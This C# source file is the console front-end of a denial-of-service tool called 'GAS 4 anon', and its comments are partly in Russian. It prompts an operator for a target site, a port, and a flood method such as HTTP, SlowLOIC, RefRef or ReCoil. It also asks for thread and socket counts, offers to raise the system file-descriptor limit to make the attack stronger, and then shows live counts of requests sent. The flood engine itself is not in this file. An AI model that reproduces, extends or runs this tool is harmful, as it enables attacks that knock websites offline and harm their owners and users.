using System;
using System.Collections.Generic;
using System.Timers;
using System.Text.RegularExpressions;

/*
     * Доработанная в плане дизайна консольная версия Газа для Украины(:D). 
     * Что сделано:
     * --Покрашено в цвета
     * --Исправлен дизайнъ
     * --Создана иконка :)
     * Что не сделано:
     * --Не сделана проверка на правильный ввод параметров по региксам. Сейчас вылетает с эксепшенами.
     * --Определение языка системы.
     * --Перевод на русский язык в рускоязычных системах.
     */

namespace GAS.TUI
{
    class Program
    {
        static DateTime d;
        static string[] Blacklist = new string[] { "epicm.org", "localhost","127.0.0", "192.168."};
        static GAS.Core.Manager Core = new GAS.Core.Manager();
      
        public static void Main(string[] args)
        {
            try { Console.Title = "GAS for urkaine"; }
            catch { }
            #region Detect oS
            string temp;
            if (Environment.OSVersion.Platform.ToString().ToLower().Contains("unix"))
                if (Environment.UserName != "root")
                    Console.Error.WriteLine("You are using Linux/Mac OS and you are not root.\r\nIf you want to use ReCoil/SlowLoic attack you must run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\"");
                else
                {
                    Console.WriteLine("Is file open limit unlocked?\r\nIf attack will not give any effect run \"ulimit -n<ShreadCount>*<SocketCount>*2+5000\" as root");
                    Console.WriteLine("Do you want to run \"ulimit -n999999\"? [true] (true|false)");
                    if (bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp))
                    {
                        try
                        {
                            System.Diagnostics.Process.Start("ulimit", "-n999999");
                        }
                        catch { }
                    }

                }
            #endregion
                 
            #region Select target
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("###############################################");
            Console.WriteLine("#                                             #");
            Console.WriteLine("#  GAS 4 anon by http://github.com/kasthack   #");
            Console.WriteLine("#                              fork by STAM   #");
            Console.WriteLine("###############################################");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Some notes:");
            Console.WriteLine("1. It is unstable designed fork.");
            Console.WriteLine("2. In square brackets are default settings.");
            Console.WriteLine("3. Contact us for bugfix.");
            Console.WriteLine("");
            Console.WriteLine("TO DO:");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("1. Сделать проверку на правильность ввода!\r\n                Я не смог :(");
            Console.ForegroundColor = ConsoleColor.Yellow; 
            Console.WriteLine("                                  [Press Enter]");
            Console.ForegroundColor = ConsoleColor.White; 
            Console.ReadLine();
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Yellow; 
            Console.WriteLine("1. Select target [www.example.com]:");
            Console.ForegroundColor = ConsoleColor.White; 
            temp = Console.ReadLine();
            temp = (temp == "" ? "www.example.com" : temp);
            foreach(string s in Blacklist)
                if (temp.ToLower().Contains(s))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("U SUK COX");
                    Environment.Exit(666);
                }
            bool IPOK = Core.LockOn(temp);
            if (!IPOK)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Wrong Target!");
                Environment.Exit(1);
            }
            #endregion
            #region GetParams
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("(!)Subsite is {0}, do you want to change it? [n] (y/n)", Core.Subsite);
            Console.ForegroundColor = ConsoleColor.White;
            if (Console.ReadLine().ToLower() == "y")
                Core.Subsite = Console.ReadLine();
            Console.ForegroundColor = ConsoleColor.Yellow; 
            Console.WriteLine("2. Enter port[80]:");
            Console.ForegroundColor = ConsoleColor.White;
            Core.Port = int.Parse((temp = Console.ReadLine()) == "" ? "80" : temp);
            #region by STAM проверка на правильность ввода
            /*
               try
                 {
                 
                 }
               catch
              {
                   Console.ForegroundColor = ConsoleColor.Red;
                   Console.WriteLine("[Invalid entry! Reenter]:");
                   Console.ForegroundColor = ConsoleColor.White;
                   Core.Port = int.Parse((temp = Console.ReadLine()) == "" ? "80" : temp);
            
             * не помню как создать проверку или бесконечное предложение ввести только число.
             * Можно и с помощью региксов.
              
                }*/ 
            Console.ForegroundColor = ConsoleColor.Yellow; 
            Console.WriteLine("3. Select attack type [ReCoil]:\r\n(UDP|TCP|HTTP|ReCoil|SlowLOIC|RefRef|AhrDosme|Post|TMOF)");
            Console.ForegroundColor = ConsoleColor.White; 
            Core.Method = (GAS.Core.AttackMethod) Enum.Parse(typeof(GAS.Core.AttackMethod), (temp=Console.ReadLine())==""?"ReCoil":temp);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("4. Enter thread count [50]:");
            Console.ForegroundColor = ConsoleColor.White; 
            Core.Threads = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("5. Enter sockets per thread [50]");
            Console.ForegroundColor = ConsoleColor.White; 
            Core.SPT = int.Parse((temp = Console.ReadLine()) == "" ? "50" : temp);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("6. Enter delay [0]:");
            Console.ForegroundColor = ConsoleColor.White; 
            Core.Delay = int.Parse((temp = Console.ReadLine()) == "" ? "0" : temp);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("7. Enter timeout[30]:");
            Console.ForegroundColor = ConsoleColor.White; 
            Core.Timeout = int.Parse((temp = Console.ReadLine()) == "" ? "30" : temp);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("8. USE Get [true]:");
            Console.ForegroundColor = ConsoleColor.White; 
            Core.USEGet = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("9. USE GZIP [true]:");
            Console.ForegroundColor = ConsoleColor.White; 
            Core.UseGZIP = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("10. Wait For Response [false]:");
            Console.ForegroundColor = ConsoleColor.White; 
            Core.WaitForResponse = bool.Parse((temp = Console.ReadLine()) == "" ? "false" : temp);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("11. Append RANDOMC hars [true]:");
            Console.ForegroundColor = ConsoleColor.White; 
            Core.AppendRANDOMChars = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("12. Append RANDOM Chars 2 Url [true]:");
            Console.ForegroundColor = ConsoleColor.White; 
            Core.AppendRANDOMCharsUrl = bool.Parse((temp = Console.ReadLine()) == "" ? "true" : temp);
            Console.WriteLine("Starting attack...");
            #endregion
            #region Start and stop
            Core.Start();
            d = DateTime.Now;
            Console.Clear();
            Timer t = new System.Timers.Timer();
            t.Interval = 500;
            t.Elapsed += new ElapsedEventHandler(t_Elapsed);
            t.Start();
            //attack started
            #region Cool UI
                Console.SetCursorPosition(0, 0);
                Console.ForegroundColor = ConsoleColor.Yellow; 
                Console.WriteLine("###############################################"); 
                Console.ForegroundColor = ConsoleColor.Green;
                try
                {
                    Console.SetCursorPosition(0, 6);
                }
                catch { }
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("###############################################");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Attacking...");
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("###############################################");
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Press Enter stop attack and exit");
                Console.ForegroundColor = ConsoleColor.Green;
            #endregion
            Console.ReadLine();
            Console.WriteLine("Exiting, please wait");
            t.Stop();
            Core.Stop();
            Console.Clear();
            #endregion
        }

        static void t_Elapsed(object sender, ElapsedEventArgs argZ)
        {
            int x = Console.CursorLeft, y = Console.CursorTop, w = Console.WindowWidth;
            char[] e = new char[w];
            string s;
            int ind = 0;
            for (int i = 0; i < w; e[i++] = ' ') ;
            try
            {
                Console.SetCursorPosition(0, 3);
            }
            catch { }
           

            Console.WriteLine(e);
            Console.WriteLine(e);
            try
            {
                Console.SetCursorPosition(0, 3);
            }
            catch { }

            Console.WriteLine("Time elapsed\tSent\tReceived\tFailed");
            s = DateTime.Now.Subtract(d).ToString();
            s = s.Substring(0, (ind = s.LastIndexOfAny(new char[] { '.', ',' })) > 0 ? ind : s.Length);

            Console.WriteLine("{0}\t{1}\t{2}\t\t{3}", s, Core.Requested, Core.Downloaded, Core.Failed);
        }
    }
}